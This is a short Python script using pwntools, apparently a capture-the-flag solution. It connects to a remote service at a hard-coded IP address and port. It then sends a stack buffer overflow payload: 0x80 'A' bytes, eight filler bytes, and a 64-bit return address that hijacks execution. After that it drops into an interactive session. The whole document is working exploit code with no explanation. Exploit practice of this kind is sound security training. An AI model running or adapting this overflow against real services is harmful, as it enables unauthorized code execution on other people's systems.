from pwn import * 

context.log_level='debug'

r = remote("111.198.29.45", 37111)

payload = 'A' * 0x80 + 'a' * 0x8 + p64(0x00400596)

r.recvuntil("Hello, World\n")
r.sendline(payload)

r.interactive()
